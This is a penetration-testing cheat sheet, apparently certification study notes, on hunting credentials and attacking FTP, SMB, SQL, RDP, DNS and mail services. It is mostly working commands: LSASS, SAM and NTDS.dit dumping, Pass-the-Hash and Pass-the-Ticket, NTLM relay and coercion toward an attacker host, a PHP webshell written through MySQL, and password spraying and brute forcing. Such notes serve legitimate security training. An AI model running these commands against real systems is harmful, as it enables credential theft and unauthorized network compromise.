# 04 - Credentials & Common Services

`$TARGET`=victim · `$LHOST`=attacker · `$USER`/`$PASS` · `$HASH` · `$DOMAIN` · `$WORDLIST`=wordlist · `$FILE`=file.
## Got a foothold — hunt creds (Windows / Linux)
**IF** you have command access on a Windows or Linux host →
- [ ] Windows: LaZagne + findstr. Linux: loop configs/history/cron, then dump memory.
```bash
start LaZagne.exe all
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
tail -n5 /home/*/.bash*
cat /etc/crontab
sudo python3 mimipenguin.py
```
WHY: LaZagne/mimipenguin scrape app stores and memory; findstr/grep hunt keywords across files, history, cron.
- [ ] works → take the `user:pass` to "Got a valid user:pass".
- [ ] fails → Windows: `firefox_decrypt`/`decrypt-chrome-passwords`, SYSVOL, web.config, unattend.xml, KeePass, AD description fields → Linux: loop `.sql .db`/`.py .pl .sh`, grep `/var/log/*`, check `.backups/passwd.bak`.
- [ ] ⏱ >10 min, no hit → jump to "traffic & shares" or "spray / stuff / defaults".
→ [[8. Password Attacks/12. Credential Hunting in Windows|src]] · [[8. Password Attacks/14. Credential Hunting in Linux|src]]
## Hunt creds in traffic & network shares
**IF** you have a PCAP or mountable SMB shares (anon/guest/valid) →
- [ ] PCredz the capture; spider the shares, then spray recovered passwords.
```bash
./Pcredz -f demo.pcapng -t -v
Snaffler.exe -s
nxc smb $TARGET -u '$USER' -p '$PASS' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=~/shares/IT --smb-timeout 60 --timeout 600
nxc smb $TARGET -u '$USER' -p '$PASS' --users
```
WHY: PCredz pulls cleartext creds from HTTP/DNS; Snaffler/spider_plus locate credential files; `--users` gives the spray list.
- [ ] works → `nxc smb $TARGET -u ~/clean_users.txt -p 'HRrocks2025!,Summer2023!,Draft456!,SecureDocs99,Form@1234' --no-bruteforce --continue-on-success`.
- [ ] fails → Wireshark (`http.request.method == "POST"`, `tcp.port == 80`, `dns`) → MANSPIDER/PowerHuntShares → grep loot locally.
- [ ] ⏱ >15 min → prioritize IT shares; encrypted traffic yields nothing.
→ [[8. Password Attacks/15. Credential Hunting in Network Traffic|src]] · [[8. Password Attacks/16. Credential Hunting in Network Shares|src]]
## Got /etc/passwd + /etc/shadow — crack Linux creds
**IF** you can read the Linux account files →
- [ ] Convert with `unshadow`, then crack the merged file.
```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
WHY: `unshadow` merges passwd+shadow into one crackable `$id$salt$hash` file.
- [ ] works → feed `unshadowed.hashes` to John/Hashcat ("Have a hash — crack it").
- [ ] fails → if `/etc/passwd` is writable, blank the root password field → `/etc/security/opasswd` often holds weaker MD5.
- [ ] ⏱ hash IDs: `1`=MD5 `2a`=Blowfish `5`=SHA-256 `6`=SHA-512 `y`=Yescrypt `7`=Scrypt; `!`/`*`=no Unix login.
→ [[8. Password Attacks/13. Linux Authentication Process|src]]
## Recovered a protected file (SSH key / docx / pdf / zip / vault) — crack it
**IF** you found a password-protected file →
- [ ] Convert with the matching `*2john` script, then crack with John.
```bash
ssh2john.py SSH.private > ssh.hash
office2john.py Protected.docx > protected-docx.hash
pdf2john.py PDF.pdf > pdf.hash
zip2john ZIP.zip > zip.hash
python3 /usr/share/john/pwsafe2john.py Employee-Passwords_OLD.psafe3 > psafe_hashes.txt
john --wordlist=$WORDLIST ssh.hash
```
WHY: each `*2john` extracts the password verifier into a crackable hash; review hits with `john <hash_file> --show`.
- [ ] works → use the recovered key/password; BitLocker: `bitlocker2john -i Backup.vhd > backup.hashes` then `grep "bitlocker\$0" backup.hashes > backup.hash`, mount with `dislocker`.
- [ ] fails → AES-256-CBC GZIP: `for i in $(cat $WORDLIST);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done`.
- [ ] ⏱ no `*2john` for the format → identify first with `hashID`.
→ [[8. Password Attacks/4. Protected files cracking|src]]
## Have a hash — identify the type, then crack it (hashcat)
**IF** you hold a hash and want GPU cracking →
- [ ] Choose `-m` (hash type) and `-a` (attack mode); list hits with `--show`.
```bash
hashcat -a 0 -m 0 $HASH $WORDLIST
hashcat -a 0 -m 0 $HASH $WORDLIST -r /usr/share/hashcat/rules/best64.rule
hashcat -a 3 -m 0 $HASH '?u?l?l?l?l?d?s'
hashcat -m 0 $HASH $WORDLIST --show
```
WHY: `-a 0`=dictionary, `-a 3`=mask/brute; `-r` applies a rule file; mask `?l`a-z `?u`A-Z `?d`0-9 `?h`hex-lower `?s`symbols `?a`all `?b`0x00-0xff.
- [ ] works → plaintext `user:pass` → go to "Got a valid user:pass".
- [ ] fails → add rules / wider masks → switch to John → build a custom wordlist.
- [ ] ⏱ >20 min on one hash → note it and jump to reuse (PtH) — don't let cracking block the exam.
→ [[8. Password Attacks/2. Hashcat|src]]
### Hash → hashcat mode → John alternative

| Hash you hold | hashcat mode | John alternative | Note |
|---|---|---|---|
| Raw MD5 | `-m 0` | `john --wordlist=$WORDLIST <hash_file>` | MD5 = hashcat mode 0 |
| NTLM (SAM / NTDS / LSASS) | `-m 1000` | same (auto-detect) | Windows local/domain NT hash |
| DCC2 / cached domain creds | `-m 2100` | — | PBKDF2, very slow, **cannot** PtH |
| NetNTLMv2 (Responder/coercion) | `-m 5600` | same | crack captured challenge-response |
| sha512crypt `$6$` / sha256crypt `$5$` | GAP: verify mode | `unshadow` → john/hashcat | Debian/RHEL default |
| md5crypt `$1$` / Yescrypt `$y$` | GAP: verify mode | same | `$1$` often from `opasswd` |
| Unknown string | — | run `hashID` first | identify before choosing a mode |
## Hash won't crack with the default mode — switch to John
**IF** hashcat misses or you want single/incremental heuristics →
- [ ] Pick the mode by what you know, then `--show`.
```bash
john --single passwd
john --wordlist=$WORDLIST <hash_file>
john --incremental <hash_file>
```
WHY: `--single` derives candidates from username/home/GECOS; `--incremental` brute-forces prioritized char combos.
- [ ] works → `john <hash_file> --show` reveals the plaintext → cross onto other services.
- [ ] fails → identify the type with `hashID` → jump back to "Have a hash".
- [ ] ⏱ >20 min → move on; record the hash for the report.
→ [[8. Password Attacks/1. John The Ripper|src]]
## Default wordlists fail — build a custom candidate list
**IF** rockyou and friends miss the target password →
- [ ] Harvest target words and build username permutations.
```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
./username-anarchy -i /home/ltnbob/names.txt
./username-anarchy Jane Smith > jane_smith_usernames.txt
```
WHY: CeWL spiders the company site; username-anarchy converts real names into common username formats.
- [ ] works → feed the list into Hashcat/Hydra and re-run cracking or spraying.
- [ ] fails → CUPP for password lists → combine with a rule file (`-r best64.rule`).
- [ ] ⏱ Google the company name for employee names first; keep harvesting under 10 min.
→ [[8. Password Attacks/3. Custom wordlists|src]]
## Many accounts, lockout policy, reused creds, appliances — spray / stuff / defaults
**IF** you have many usernames, a lockout policy, reused creds, or an appliance login →
- [ ] Spray ONE password across many accounts; stuff combolists; check factory defaults.
```bash
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
hydra -C user_pass.list ssh://$TARGET
pip3 install defaultcreds-cheat-sheet
creds search linksys
```
WHY: spraying = one password × many users (stays under lockout); stuffing=`-C` combolist; the cheat sheet covers appliances. Scope: 04 owns generic / appliance / service spray (this node); AD / domain spray lives in [[08 - Active Directory & Lateral Movement]] §Internal password spraying.
- [ ] works → add the pairing to the list and re-spray → pivot to reuse (PtH/PtT).
- [ ] fails → seasonal/corporate passwords first → localize keywords (`Benutzer`) → reach a bound service via tunnel (`ssh -L 3306:localhost:3306 $USER@$TARGET` then `hydra -C sqlcred.list mysql://127.0.0.1 -t 4`).
- [ ] ⏱ max ONE password per user per window; count the lockout threshold before every round.
→ [[8. Password Attacks/6. Spraying, Stuffing, and Defaults|src]]
## Got a valid user:pass — where does it actually work?
**IF** you have confirmed creds and want the full blast radius →
- [ ] Sweep every protocol with NetExec, read shares, then reach WinRM/SSH.
```bash
netexec <protocol> <target-ip> -u <user or userlist> -p <password or passwordlist>
netexec smb $TARGET -u "$USER" -p "$PASS" --shares
netexec winrm $TARGET -u user.list -p password.list
evil-winrm -i $TARGET -u $USER -p $PASS
```
WHY: one credential often works across many services; WinRM (5985/5986) and SSH are the shell-bearing ones.
- [ ] works → document the accepting services → jump to reuse (PtH/PtT) and lateral movement.
- [ ] fails → `hydra -L user.list -P password.list ssh://$TARGET` → confirm the cred is not expired/domain-scoped.
- [ ] ⏱ >10 min → log the working pair and pivot.
→ [[8. Password Attacks/5. Network Services|src]]
## Have an NTLM hash, no plaintext — Pass-the-Hash
**IF** you dumped an NTLM hash and need lateral movement without the password →
- [ ] Authenticate with the hash directly (Windows and Linux paths).
```bash
mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /rc4:$HASH /domain:$DOMAIN /run:cmd.exe" exit
impacket-psexec administrator@$TARGET -hashes :$HASH
evil-winrm -i $TARGET -u Administrator -H $HASH
xfreerdp /v:$TARGET /u:julio /pth:$HASH
```
WHY: NTLM challenge-response is unsalted, so the hash alone authenticates a session.
- [ ] works → `netexec smb $TARGET -u Administrator -d . -H $HASH -x whoami`; `--local-auth` to spray the local admin hash across a subnet → [[08 - Active Directory & Lateral Movement]].
- [ ] fails → RDP PtH needs Restricted Admin: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` → if UAC blocks, target RID-500 "Administrator" or set `LocalAccountTokenFilterPolicy=1`.
- [ ] ⏱ two tool switches (Mimikatz ↔ Impacket ↔ NetExec) then stop.
→ [[8. Password Attacks/17. Pass the Hash|src]]
## Have a Kerberos ticket / key — Pass-the-Ticket / Pass-the-Key
**IF** you hold a `.kirbi`/Base64 ticket or a user's Kerberos keys →
- [ ] Harvest, then forge/inject the ticket.
```bash
Rubeus.exe dump /nowrap
Rubeus.exe asktgt /domain:$DOMAIN /user:plaintext /aes256:$HASH /nowrap
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-$DOMAIN.kirbi
```
WHY: a TGT opens any service the user can reach; OverPass-the-Hash forges one from a key without the password.
- [ ] works → `Enter-PSSession -ComputerName DC01` or `kerberos::ptt "<ticket>.kirbi"` → [[08 - Active Directory & Lateral Movement]].
- [ ] fails → Linux ccache: `export KRB5CCNAME=/root/krb5cc_...` then `impacket-wmiexec dc01 -k` → `impacket-ticketConverter` moves ccache↔kirbi.
- [ ] ⏱ GAP: notes only, no command for Kerberos internals — if a Mimikatz `sekurlsa::ekeys` export shows a wrong etype, re-export with Rubeus.
→ [[8. Password Attacks/18. Pass the Ticket (PtT) from Windows|src]]
## Have a cert / .pfx — Pass-the-Certificate
**IF** you can obtain an X.509/.pfx for a user or machine account →
- [ ] Get a TGT via PKINIT, then request replication.
```bash
impacket-ntlmrelayx -t http://$TARGET/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip $TARGET 'inlanefreight.local/dc01$' /tmp/dc.ccache
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip $TARGET -just-dc-user Administrator '$DOMAIN/DC01$'@DC01.$DOMAIN
```
WHY: PKINIT authenticates a cert+key without a password → TGT; a DC machine TGT enables DCSync.
- [ ] works → DCSync output = domain compromise → [[08 - Active Directory & Lateral Movement]].
- [ ] fails → coerce first: `python3 printerbug.py $DOMAIN/$USER:"$PASS"@$TARGET $LHOST` → Shadow Credentials: `pywhisker --dc-ip $TARGET -d $DOMAIN -u $USER -p '$PASS' --target Administrator --action add`.
- [ ] ⏱ add the DC to `/etc/hosts` + a realm in `/etc/krb5.conf` before debugging "Cannot find KDC for realm".
→ [[8. Password Attacks/20. Pass the Certificate|src]]
## Local admin on Windows — SAM / SYSTEM / SECURITY hives
**IF** you have local admin and want local hashes + LSA secrets →
- [ ] Save the three hives, exfil, then dump and crack.
```bash
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
WHY: `HKLM\SAM`=local NTLM hashes, `HKLM\SYSTEM`=SysKey to decrypt them, `HKLM\SECURITY`=LSA secrets (DCC2, DPAPI).
- [ ] works → `user:hash` → go to PtH; `hashcat -m 1000 hashestocrack.txt $WORDLIST` also cracks to plaintext.
- [ ] fails → remote dump: `netexec smb <target> --local-auth -u $USER -p $PASS --lsa` / `--sam`; DCC2 (`-m 2100`) is slow — prefer DPAPI via `DonPAPI`/`mimikatz`.
- [ ] ⏱ SAM is useless without SYSTEM — never exfil one alone.
→ [[8. Password Attacks/8. Attacking SAM, SYSTEM, and SECURITY|src]]
## Interactive Windows session — dump LSASS memory
**IF** you have GUI/CLI access and want in-memory creds →
- [ ] Grab the LSASS PID, dump it, pull and crack offline.
```bash
tasklist /svc
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
WHY: LSASS caches creds/tokens/tickets; the dump is analysed offline on the attack host.
- [ ] works → crack extracted NT with `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b $WORDLIST`.
- [ ] fails → GUI fallback: Task Manager → right-click "Local Security Authority Process" → "Create dump file" (`%temp%\lsass.DMP`) → transfer the dump off-host first.
- [ ] ⏱ comsvcs MiniDump is AV-flagged — if it dies, pivot to SAM/NTDS dumping.
→ [[8. Password Attacks/9. Attacking LSASS|src]]
## Want stored vault creds — Windows Credential Manager
**IF** you want stored/vault (browser/OneDrive/domain) credentials →
- [ ] Enumerate stored creds, then impersonate or decrypt.
```bash
cmdkey /list
runas /savecred /user:SRV01\mcharles cmd
rundll32 keymgr.dll,KRShowKeyMgr
```
WHY: `Domain:interactive=` creds run with `runas /savecred`; vault export via keymgr; Mimikatz `sekurlsa::credman` decrypts from LSASS.
- [ ] works → the impersonated session inherits the stored logon → try PtH/PtT next.
- [ ] fails → Mimikatz `privilege::debug` → `sekurlsa::credman` → or LaZagne `windows` module; vault files under `%UserProfile%\AppData%\...\Microsoft\Vault`.
- [ ] ⏱ `.crd` backups are user-password encrypted — don't chase them without the password.
→ [[8. Password Attacks/10. Attacking Windows Credential Manager|src]]
## Domain admin on a DC — dump NTDS.dit
**IF** you hold Domain Admin (or local admin on a DC) →
- [ ] Snapshot via VSS, copy NTDS.dit + SYSTEM, dump, crack or PtH.
```bash
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
netexec smb $TARGET -u $USER -p P@55w0rd! -M ntdsutil
```
WHY: `NTDS.dit` stores every domain hash; a VSS snapshot bypasses the file lock; `-M ntdsutil` captures+dumps in one shot.
- [ ] works → crack `-m 1000` or skip cracking and PtH: `evil-winrm -i $TARGET -u Administrator -H $HASH`.
- [ ] fails → download `NTDS.dit` AND `SYSTEM`, dump locally (`impacket-secretsdump -ntds ... -system ... LOCAL`) → [[08 - Active Directory & Lateral Movement]].
- [ ] ⏱ both files must come down — the hashes are encrypted with a key in SYSTEM.
→ [[8. Password Attacks/11. Attacking Active Directory and NTDS.dit|src]]
## FTP exposed (21)
**IF** port 21/ftp is open →
- [ ] Test anonymous, brute force, consider a bounce.
```bash
ftp $TARGET
medusa -u fiona -P $WORDLIST -h $TARGET -M ftp
nmap -Pn -v -n -p80 -b $FTP_SERVER $TARGET
```
WHY: anonymous or brute-forced creds grant file access; the FTP `PORT` command can relay (bounce) traffic.
- [ ] works → pillage: `wget -m --no-passive ftp://$USER:$PASS@$TARGET` → hunt creds in the loot.
- [ ] fails → Hydra `ftp://` module → non-standard ports (labs use 2121/30021).
- [ ] ⏱ >10 min → treat FTP as a file source, not a shell.
→ [[9. Attacking common Services/2. Attacking FTP|src]]
## SMB exposed (139/445)
**IF** SMB is open and you need shares, hashes, or RCE →
- [ ] Null-enumerate, then RCE / dump / PtH, and capture forced auth.
```bash
smbclient -N -L //10.129.14.128
nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
impacket-psexec administrator:'$PASS'@10.10.110.17
nxc smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
WHY: SMB allows null sessions, RCE (psexec/smbexec/atexec), hash capture (Responder) and relay (ntlmrelayx).
- [ ] works → read shares and hunt creds; `nxc smb 10.10.110.17 -u Administrator -p '$PASS' -x 'whoami' --exec-method smbexec` for RCE.
- [ ] fails → coercion (Responder + `hashcat -m 5600`): full recipe in [[08 - Active Directory & Lateral Movement]] §LLMNR/NBT-NS poisoning → if uncrackable, relay with `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`.
- [ ] ⏱ set SMB=`OFF` in `/etc/responder/Responder.conf` before ntlmrelayx, or they fight over the port.
→ [[9. Attacking common Services/3. Attacking SMB|src]]
## SQL exposed (MSSQL 1433 / MySQL 3306)
**IF** a database port is open and you have (or guess) creds →
- [ ] Connect, then enable command exec / write files / capture the service hash.
```bash
mssqlclient.py -p 1433 julio@10.129.203.7
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
mysql -u julio -pPassword123 -h 10.129.20.13
```
WHY: `xp_cmdshell` runs OS commands as the service account; OUTFILE/Ole Automation writes a webshell; `xp_dirtree` forces auth to your fake SMB server (NTLMv2 capture).
- [ ] works → RCE: `sp_configure 'show advanced options', 1` → `RECONFIGURE` → `sp_configure 'xp_cmdshell', 1` → `RECONFIGURE` → `xp_cmdshell 'whoami'`; capture: `EXEC master..xp_dirtree '\\10.10.110.17\share\'` with `sudo responder -I tun0` up.
- [ ] fails → write webshell (MySQL `SELECT "<?php shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';`, check `secure_file_priv`) → impersonate: `EXECUTE AS LOGIN = 'sa'` then `sysservers`/linked servers.
- [ ] ⏱ localhost-bound MySQL? tunnel: `ssh -L 3306:localhost:3306 $USER@$TARGET` then `hydra -C sqlcred.list mysql://127.0.0.1 -t 4`.
→ [[9. Attacking common Services/4. Attacking SQL Databases|src]]
## RDP exposed (3389)
**IF** RDP is open and credentials exist →
- [ ] Spray, hijack a live session, or PtH.
```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
query user
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
WHY: RDP spray = one password × many users; session hijack (SYSTEM + `tscon`) takes a logged-in user's desktop; `/pth` gives GUI access with only an NT hash.
- [ ] works → connect: `xfreerdp /u:$USER /p:'$PASS' /v:$TARGET /cert-ignore`; mount a drive for transfer.
- [ ] fails → hijack: `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` (needs SYSTEM) → RDP PtH requires Restricted Admin (see PtH).
- [ ] ⏱ session hijack no longer works on Server 2019 — don't burn time there.
→ [[9. Attacking common Services/5. Attacking RDP|src]]
## DNS exposed (53)
**IF** a DNS server is reachable →
- [ ] Attempt an AXFR zone transfer, then enumerate subdomains.
```bash
nmap -p53 -Pn -sV -sC 10.10.110.213
dig axfr inlanefreight.htb @10.129.12.186
fierce --domain zonetransfer.me
./subfinder -d inlanefreight.com -v
```
WHY: a misconfigured server leaks the whole namespace via AXFR; subfinder/subbrute enumerate subdomains; a dangling CNAME signals takeover.
- [ ] works → feed discovered hostnames into web/service recon and [[08 - Active Directory & Lateral Movement]] (DC names).
- [ ] fails → `fierce` tests other NS → self-define resolvers: `echo "ns1.inlanefreight.com" > ./resolvers.txt` then `./subbrute.py ...`.
- [ ] ⏱ AXFR works in seconds or is refused — don't retry-loop it.
→ [[9. Attacking common Services/6. Attacking DNS|src]]
## Mail services exposed (SMTP/POP3/IMAP)
**IF** mail ports are open (25/143/110/465/587/993/995) →
- [ ] Enumerate users, spray, read mail, or abuse an open relay.
```bash
smtp-user-enum -M VRFY -U users.txt -D target.com -t <ip>
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```
WHY: SMTP `VRFY`/`EXPN`/`RCPT` enumerate valid addresses; Hydra attacks POP3/IMAP/SMTP; an open relay lets you spoof the source for phishing.
- [ ] works → read the mailbox (POP3 `USER`/`PASS`/`LIST`/`RETR 1`; IMAP `a1 login ...`/`a3 SELECT INBOX`/`a4 FETCH 1 BODY[]`) for creds/hostnames.
- [ ] fails → `smtp-user-enum -M RCPT` (if VRFY rejected) → `o365spray.py --validate/--enum/--spray` for cloud mail → `swaks --from ... --to ... --server <ip>` to test relaying.
- [ ] ⏱ try seasonal/corporate passwords BEFORE rockyou — mail lockouts are noisy.
→ [[9. Attacking common Services/7. Attacking Email Services|src]]
## Need brute force against many services (Hydra / Medusa)
**IF** you must brute a protocol or a web login →
- [ ] Pick the Hydra module (single host) or Medusa (many hosts / parallel).
```bash
hydra -L usernames.txt -P passwords.txt www.example.com http-get
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyz 192.168.1.100 rdp
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```
WHY: Hydra drives protocol modules (http-get, http-post-form, ftp, ssh, rdp, pop3, smb, mysql); Medusa `-H` runs a host file, `-M` selects the module, `-e ns` tests null + user-as-password.
- [ ] works → validate the pair, then reuse (PtH/PtT) if a hash is derivable.
- [ ] fails → Crowbar for RDP spray → fix the `S=`/`F=` success/failure string in http-post-form → lower `-t`.
- [ ] ⏱ watch lockout on domain accounts; keep `-t` low.
→ [[13. Login Bruteforcing/1. Hydra|src]] · [[13. Login Bruteforcing/2. Medusa|src]]
## Loop-back
New artifact → re-enter at the matching section:

| New thing | Re-run |
|---|---|
| New hostname / share | "hunt creds" / "traffic & shares" |
| New `user:pass` | "Got a valid user:pass" → reuse (PtH/PtT) |
| New hash | "Have a hash — crack it" → mode table → reuse |
| New Windows foothold | SAM / LSASS / Credential Manager |
| New Linux foothold | passwd+shadow → SSH spray |
| Reached a DC / Domain Admin | NTDS.dit → Pass-the-Certificate → [[08 - Active Directory & Lateral Movement]] |
| Need a shell from creds | [[05 - Shells, Transfers & Metasploit]] |

> Pass-the-Hash / Pass-the-Ticket / Pass-the-Certificate are also first-class moves in the AD phase — see [[08 - Active Directory & Lateral Movement]].
